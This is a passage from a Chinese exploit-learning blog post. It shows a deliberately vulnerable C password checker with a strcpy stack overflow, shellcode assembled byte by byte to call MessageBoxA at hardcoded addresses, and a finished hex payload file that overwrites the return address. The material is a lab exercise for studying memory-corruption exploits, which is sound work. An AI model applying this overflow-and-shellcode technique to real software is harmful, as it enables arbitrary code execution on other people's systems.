+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>verify_password</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>password</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>authenticated</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>44</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=n>authenticated</span> <span class=o>=</span> <span class=nf>strcmp</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>PASSWORD</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>strcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>password</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>authenticated</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>valid_flag</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>password</span><span class=p>[</span><span class=mi>1024</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=n>FILE</span> <span class=o>*</span> <span class=n>fp</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>LoadLibrary</span><span class=p>(</span><span class=s>&#34;user32.dll&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>fp</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;password.txt&#34;</span><span class=p>,</span> <span class=s>&#34;rw+&#34;</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nf>fscanf</span><span class=p>(</span><span class=n>fp</span><span class=p>,</span> <span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>password</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>valid_flag</span> <span class=o>=</span> <span class=nf>verify_password</span><span class=p>(</span><span class=n>password</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>valid_flag</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;ERROR!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;OK!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nf>fclose</span><span class=p>(</span><span class=n>fp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h5 id=分析expstd0103>分析(ExpStd0103)</h5><blockquote><p>目标：在程序验证时植入代码，实现弹窗MessageBox</p></blockquote><ul><li>必要信息<ul><li>数组起始地址：<code>0x0012FAF0</code>(也是ShellCode执行的起始地址)</li><li>MessageBoxA地址：<code>0x77D507EC</code></li><li>十六进制的文字：<code>4D6F656F6D75</code>(Moeomuoo)</li></ul></li><li>组成的机器码</li></ul><div class=table-wrapper><table><thead><tr><th>机器码(HEX)</th><th>汇编码</th><th>注释</th></tr></thead><tbody><tr><td>33DB</td><td>XOR EBX, EBX</td><td>清空EBX，保证ShellCode中无0(截至符)</td></tr><tr><td>53</td><td>PUSH EBX</td><td>字符串末尾的<code>\0</code></td></tr><tr><td>68 6D756F6F</td><td>PUSH 6F6F756D</td><td>压入文字字节muoo(0x6D756F6F)</td></tr><tr><td>68 4D6F656F</td><td>PUSH 6F656F4D</td><td>压入文字字节Moeo(0x4D6F656F)</td></tr><tr><td>8BC4</td><td>MOV EAX, ESP</td><td>ESP栈顶指向字符串Moeomuoo，移交给EAX</td></tr><tr><td>53</td><td>PUSH EBX</td><td>MB_OK</td></tr><tr><td>50</td><td>PUSH EAX</td><td>Message</td></tr><tr><td>50</td><td>PUSH EAX</td><td>Caption</td></tr><tr><td>53</td><td>PUSH EBX</td><td>Handle</td></tr><tr><td>B8 EC07D577</td><td>MOV EAX, 0x77D507EC</td><td>将MessageBoxA的地址硬编码移入EAX</td></tr><tr><td>FFD0</td><td>CALL EAX</td><td>调用MessageBoxA</td></tr></tbody></table></div><ul><li>将机器码按照顺序写入password.txt<ul><li>53-56字节填入返回地址(Buffer的起始地址)，其余字节用0x90填充</li></ul></li><li>填充运行测试发现，最后只剩下2字节的空间可用，唯一不完美的地方在于程序崩溃退出</li></ul><blockquote><p>以下是最终的password.txt</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=mi>33</span> <span class=n>DB</span> <span class=mi>53</span> <span class=mi>68</span> <span class=mi>6</span><span class=n>D</span> <span class=mi>75</span> <span class=mf>6F</span> <span class=mf>6F</span>  <span class=mi>68</span> <span class=mi>4</span><span class=n>D</span> <span class=mf>6F</span> <span class=mi>65</span> <span class=mf>6F</span> <span class=mi>8</span><span class=n>B</span> <span class=n>C4</span> <span class=mi>53</span>
+</span></span><span class=line><span class=cl><span class=mi>50</span> <span class=mi>50</span> <span class=mi>53</span> <span class=n>B8</span> <span class=n>EC</span> <span class=mo>07</span> <span class=n>D5</span> <span class=mi>77</span>  <span class=n>FF</span> <span class=n>D0</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span>
+</span></span><span class=line><span class=cl><span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span>  <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span>
+</span></span><span class=line><span class=cl><span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=n>F0</span> <span class=n>FA</span> <span class=mi>12</span> <span class=mo>00</span>
+</span></span></code></pre></td></tr></table></div></div><hr><h2 id=总结>总结</h2><p>本文讨论了如何利用缓冲区溢出漏洞以及ShellCode的编写，但不足之处在于硬编码地址和栈空间移位的问题<br>有关这些问题下一篇讨论</p></section><footer class=article-footer><section class=article-tags><a href=/zh-cn/tags/windows/>Windows</a>
+<a href=/zh-cn/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/>栈溢出</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-010-heapspray/><div class=article-details><h2 class=article-title>漏洞利用学习笔记-010-HeapSpray</h2></div></a></article><article><a href=/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-021-%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/><div class=article-details><h2 class=article-title>漏洞利用学习笔记-021-保护下的堆</h2></div></a></article><article><a href=/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-020-sehop%E7%AE%80%E4%BB%8B/><div class=article-details><h2 class=article-title>漏洞利用学习笔记-020-SEHOP简介</h2></div></a></article><article><a href=/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-019-%E5%88%A9%E7%94%A8heapspray%E6%94%BB%E5%87%BBaslr/><div class=article-details><h2 class=article-title>漏洞利用学习笔记-019-利用HeapSpray攻击ASLR</h2></div></a></article><article><a href=/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-018-%E5%88%A9%E7%94%A8%E9%83%A8%E5%88%86%E8%A6%86%E7%9B%96%E5%AE%9A%E4%BD%8D/><div class=article-details><h2 class=article-title>漏洞利用学习笔记-018-利用部分覆盖定位</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=Moeomu/blog data-repo-id=R_kgDOHHJl4A data-category=Announcements data-category-id=DIC_kwDOHHJl4M4CR7uM data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en crossorigin=anonymous async></script>
+<script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"dark_dimmed")}})()</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2023 Misaka的秘密花园</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.21.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
+<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
